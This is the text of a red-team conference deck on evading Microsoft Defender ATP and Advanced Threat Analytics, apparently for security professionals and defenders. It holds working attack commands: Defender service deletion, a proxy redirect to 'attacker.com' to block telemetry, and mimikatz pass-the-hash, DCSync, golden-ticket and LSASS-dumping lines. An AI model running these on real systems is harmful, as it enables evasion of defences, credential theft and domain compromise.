01
02
03
MS Just Gave the Blue Team Tactical Nukes
(And How Red Teams Need To Adapt)
2
IBM Security
Whoami
• @retBandit
• Red Team Ops Lead at IBM X-Force Red
• Part of CREST (crest-approved.org)
• I like mountain biking, drones, and beer
• Canadian, sorry not sorry
3
IBM Security
4
IBM Security
Tactical Nukes?
5
IBM Security
6
IBM Security
TTP
Host Recon
Gain a Foothold
External Recon
Internal Recon
Dominance
Lateral Movement
Exploit Vulnerabilities
Spear Phishing
Social Engineering
Malicious USB Media
Wireless
Physical
Host Recon
Host Controls/Logging Recon
Host Controls Bypass
Tools Transfer
Short-Term Persistence 
Host Privilege Escalation
Credential Theft
Network Recon
Domain Recon
Asset Recon
Admin Recon
Network Security Recon
Passive Information Gathering
Active Information Gathering
Port Scanning
Service Enumeration
Network/App Vuln Identification
Evade Network Security Controls
Lateral Movement
Network Exploitation
Elevate Network Privileges
Gain Domain Admin
Gain Asset Admin
Sensitive Asset Access
Exfill Sensitive Data
Long-Term Persistence
7
IBM Security
We’re Talking Post Breach
Source: https://blogs.microsoft.com/microsoftsecure/2016/11/28/disrupting-the-kill-chain/
8
IBM Security
The Laboratory
9
IBM Security
ATP Overview
Source: MS
10
IBM Security
Coming in Release 3
Defender “brand” expanded to include:
• Windows Defender Antivirus
• Windows Defender Advanced Threat Protection 
• Windows Defender.... Exploit Guard 
• ... Application Guard 
• ... Device Guard 
• ... Credential Guard 
• More OS
Source: https://blogs.windows.com/business/2017/06/27/announcing-end-end-security-features-windows-10/
https://techcrunch.com/2017/06/08/microsoft-confirms-its-acquired-hexadite-sources-say-for-100m/
11
IBM Security
12
IBM Security
Gaining a Foothold
13
IBM Security
Gaining a Foothold w/ Out Of The Box PS Payloads
14
IBM Security
Obfuscated PS Payloads
15
IBM Security
They promised us freedom.
16
IBM Security
But delivered slavery.
17
IBM Security
ATP is a Beneficiary of WMF 5 / Win10 1703 Security Improvements
• Window Management Framework (“PowerShell”) 5.1 provides:
̶ PS Script Block Logging 
̶ PS Transaction/Transcription Logging
̶ PS “Suspicious Strings” 
̶ PS Constrained Language Mode
̶ Just Enough Admin (JEA) support 
• ATP leverages client-side AMSI detections for PowerShell, with 
improvements for JavaScript & VBScript in RS3
18
IBM Security
ATP is a Beneficiary of WMF 5 / Win10 1703 Security Improvements
• Can’t downgrade to PSv2 
• System-wide transcripts
• Common techniques leveraging WScript.Shell, 
etc. are also caught.
• Can’t just use NotPowerShell (NPS) or call 
directly as still forced to use WMF 5
19
IBM Security
Defender ATP ≠ Defender AV
20
IBM Security
Side note: Traditional Defender AV
By the time you read these tweets over your morning 
coffee, your target’s Defender AV instances were 
already patched...
21
IBM Security
Not Detected: Misc. Techniques to Gain Initial Foothold
• Obfuscated JScript/VBscript payloads that don’t use Kernel32 API 
declarations (such as @vysecurity’s CACTUSTORCH) 
• Using signed exec’s to load a Cobalt stageless DNS-based reverse 
payload, i.e.; “rundll32 foo.dll,Start”
• Some executables created with Veil (go-based) and Shellter
https://www.mdsec.co.uk/2017/07/payload-generation-with-cactustorch/
https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html
https://github.com/nccgroup/winpayloads
22
IBM Security
Remember, we’re talking POST Breach
23
IBM Security
Host Recon
echo %userdomain%
echo %logonserver%
echo %homepath%
echo %homedrive%
net share
net accounts
systeminfo
tasklist /svc
gpresult /z
net localgroup Administrators
netsh advfirewall show allprofiles state
systeminfo
$env:ComSpec
$env:USERNAME
$env:USERDOMAIN
$env:LOGONSERVER
Tree $home 
24
IBM Security
Not Detected: WMI
wmic process list brief
wmic group list brief
wmic computersystem list 
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True’”
25
IBM Security
Not Detected: Host Recon Directly Using Windows API’s
• Host-only info gathering directly calling Window’s APIs through 
raw sockets, Metasploit railgun, etc. 
• Use MSF modules with (local) API calls, such as 
file_from_raw_ntfs.rb
• Don’t use MSF modules like local_admin_search_enum.rb
• CobaltStrike has a number of modules that are API-only
26
IBM Security
Can’t stop ATP process, service, etc., even if running as system
27
IBM Security
Uninstalling
• Unlike other PSP/cloud AV products like CrowdStrike, you can’t just uninstall them from an elevated 
command prompt.
wmic product where "description='CrowdStrike Sensor Platform’” Uninstall
• ATP requires a generated offboarding script with a SHA256 signed reg key:
28
IBM Security
“Protected Process Light”
29
IBM Security
PPL Bypass
• Defender AV service can be stopped/deleted via Project0’s privileged 
Antimalware PPL bypass:
sc config TrustedInstaller binPath= "cmd.exe /C sc stop 
windefend && sc delete windefend" && sc start 
TrustedInstaller
• ... since RS2, ATP runs now at a Windows PPL protection level instead of a 
AntiMalware PPL, and the process is configured as “NOT_STOPPABLE”
30
IBM Security
• The ATP sensor communicates using 
Windows Telemetry (DiagTrack service) 
• Telemetry in turn uses WinHTTP Services
• The WinHTTP API is independent of 
WinINet browser proxy settings
Telemetry & Cloud Comms
• However, it will follow statically set proxy 
settings within HKCU
31
IBM Security
Block ATP Comms as an Unprivileged User
reg add 
"HKCU\Software\Microsoft\Windows\
CurrentVersion\Internet Settings" ^ /v 
AutoDetect /t REG_DWORD /d 0 /f
reg add 
"HKCU\Software\Microsoft\Windows\
CurrentVersion\Internet Settings" /v 
AutoConfigURL /t REG_SZ /d 
"http://attacker.com/wpad.dat" /f
32
IBM Security
Block ATP Comms via DiagTrack Service (Privileged)
• While we can’t stop the ATP Sense service as it’s running a Windows PPL 
protected process, Diagtrack is not a PPL:
33
IBM Security
Block All Windows Defender/ATP Comms via FW (Privileged)
You can use the same (privileged) technique to block in/out traffic for WinRM, 
Sysmon via Windows Event Forwarding, SCOM, etc.
34
IBM Security
Why Block Instead Of Disabling?
35
IBM Security
Advanced Threat Analytics
“ATA captures and parses network traffic of multiple protocols (such as Kerberos, 
DNS, RPC, NTLM and others) for authentication, authorization and information 
gathering.” 
Designed to Detect:
https://docs.microsoft.com/en-us/advanced-threat-analytics/what-is-ata
• Pass-the-Ticket (PtT)
• Pass-the-Hash (PtH)
• Overpass-the-Hash
• Forged PAC (MS14-068)
• Golden Ticket
• Malicious replications
• Reconnaissance
• Brute force
• Remote execution
• Weak/malicious protocol usage
• Abnormal user behavior
• Modification of sensitive groups
36
IBM Security
ATA  Architecture
• ATA relies on the following Windows events: 
4776, 4732, 4733, 4728, 4729, 4756, 4757
37
IBM Security
38
IBM Security
39
IBM Security
ATA Learning Period
1 month of learning:
• Abnormal behavior
• Abnormal sensitive group modification
• Recon using Directory Services
1 week of learning:
• Encryption downgrades (skeleton key, golden ticket, over pass the hash)
• Brute force
40
IBM Security
Internal Recon
41
IBM Security
Detected: Bulk DNS queries, nslookup, zone transfers
42
IBM Security
Detected*: AD Recon using SAMR protocol or tools like “net user /domain”
43
IBM Security
Not Detected: Using LDAP/Powerview To Gather Computers/Users
44
IBM Security
Not Detected: Enumeration via WMI Local Name Space
Domain User Accounts:
Get-WmiObject -Class Win32_UserAccount -Filter "Domain='dev' AND 
Disabled='False'" | Select Name, Domain, Status, LocalAccount, 
AccountType, Lockout, PasswordRequired, PasswordChangeable, 
Description, SID
Domain Groups:
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND 
Name like '%Admin%’”
45
IBM Security
Not Detected: Enumeration via WMI Local Name Space (Cont’d)
Domain Group User Memberships:
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' 
AND Name='Enterprise Admins'" | Get-CimAssociatedInstance -
Association Win32_GroupUser
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' 
AND Name='Microsoft Advanced Threat Analytics Administrator'" | 
Get-CimAssociatedInstance -Association Win32_GroupUser
46
IBM Security
Detected: Default Session Enumeration via UserHunter, NetSess
47
IBM Security
Not Detected: Session Enumeration By Excluding DC’s
48
IBM Security
Lateral Movement
49
IBM Security
Detection (ATA): Lateral Movement
Usually detected (against DC’s only):
• WMIexec
• PSexec
May be detected due to “abnormal user behavior” against domain members:
• WMIexec
• PSexec
• WinRM
• DCOM
• PSexec/SMBexec
• RDP
• Remote Registry
• PSRemoting/WinRM
50
IBM Security
Detected: Over-Pass-The-Hash (Using KRBTGT NTLM Hash)
51
IBM Security
Not Detected: Over-Pass-The-Hash (Using All Hash/Keys)
sekurlsa::pth /user:administrator /domain:prod.local
/aes256:12d23a766f9bac2a6e31b3afbd4f41a2d49b336b76f1edbe3d8b2fa9c9848d4
/ntlm:4c4715b4028d7aba53130d0db3de13fe 
/aes128: 00000000000000000000000000000000
52
IBM Security
Not Detected: Silver Tickets
• While a Golden ticket is a forged TGT valid for gaining access to 
any Kerberos service, the silver ticket is a forged TGS. 
• TGS is forged, so no associated TGT, meaning the DC is never 
contacted.
• Any event logs are on the targeted server.
Source: blatant copy & paste from Sean Metcalf- https://adsecurity.org/?p=2011
53
IBM Security
Not Detected: Lateral Movement via SQL Auth
• SQL authentication events are local to the server
• Target sa accounts, compromise SQL servers that have privileged 
AD user sessions using tools like PowerUpSQL
• Cross-Forest SQL trusts can also be targeted as demonstrated by 
Nikhil- http://www.labofapenetrationtester.com/2017/03/using-sql-
server-for-attacking-forest-trust.html
54
IBM Security
Dominance
55
IBM Security
Detected (ATA): DCSync
mimikatz # lsadump::dcsync /domain prod.local /user:admin
56
IBM Security
Partial Detection: Copying NTDS.dit File Remotely using WMI
• We can use the WMI Win32_ShadowCopy Class to dump the ntds.dit via 
volume shadow copies without having to call vssadmin.exe
• Now flagged as a LOW severity event in ATA 1.8 due to executing 
Win32_process create, but not for the use of volume shadow copy:
57
IBM Security
Not Detected*: PSRemoting with LSASS Inject
• PowerSploit: Mimikatz in memory w/ LSASS Injection
Invoke-Mimikatz -Command '"privilege::debug" 
"LSADump::LSA /inject"' -Computer dc03.prod.local
Blue Tip: Lots of ways to harden/log WinRM/PSRemoting, restrict via 
groups/source, etc.
58
IBM Security
Not Detected*: PSRemoting with Raw Disk Access
• PowerSploit: Ninja-Copy
Invoke-NinjaCopy -Path 
"c:\Windows\System32\config\SYSTEM" -ComputerName
"dc03.prod.local" -LocalDestination "c:\temp\system“
Blue Tip: You can detect LSASS injection/raw disk access with 
Sysmon
59
IBM Security
Detected: Golden Tickets Detection (Using KRBTGT NTLM Hash)
kerberos::golden /user:EdwardAbbey /domain:prod.local
/sid:sid /krbtgt:rc4 /groups:513,512,520,518,519 /ptt
60
IBM Security
Not Detected: Golden Ticket w/ AES Key
kerberos::golden /user:JohnVanwagoner
/domain:prod.local /sid:sid /aes256:aes256
/groups:512,513,519 /startoffset:-1 /endin:2500 
/renewmax:3000 /ptt
61
IBM Security
Blue Team Takeaways
• Limit PS Remoting sources to dedicated admin workstations
• Use JEA (Just Enough Administration) to prevent lateral 
movement success
• Harden SQL servers, review forest trusts
• Integrate SIEM/VPN logs into ATA
• Use Event Log Forwarding for sysmon and WMI logging with 
shorter polling times
• Integrate all those new Defender branded tools like Exploit Guard
62
IBM Security
Red Team Takeaways
• Return to living off the land, directly call APIs
• Leverage host based PowerShell tools only after you’ve blocked 
or disabled ATP & event log forwarding
• Review RDP/PS/Session history to help avoid user behavior 
analytics
• Block event log forwarding to prevent Sysmon/WMI/PowerShell/ 
Security logs giving you away
• Focus on info gathering and lateral movement techniques that 
don’t comm with the DC, like SQL auth and Silver Tickets
• Use AES for Over-PTH, Golden Tickets
• Abuse Forest Trusts
63
IBM Security
Big Thanks / Sources
• @angus_tx, @nosteve, @swordgardctf, and the rest of the IBM X-Force Red 
crew- we’re hiring!
• The MS ATA/ATP team
• Tools, techniques, assistance and research by: @PyroTek3,@cobbr_io, 
@mattifestation, @danielhbohannon, @nikhil_mitt, @mubix, @JosephBialek, 
@kevin_Robertson, @subTee, @0xbadjuju, @_nullbind, @gentilkiwi, 
@armitagehacker, @alastairgray, @harmj0y, @JershMagersh, @vysecurity, 
@cybera, @passingthehash and many others in the community
• @simonstalenhag for permission to use his art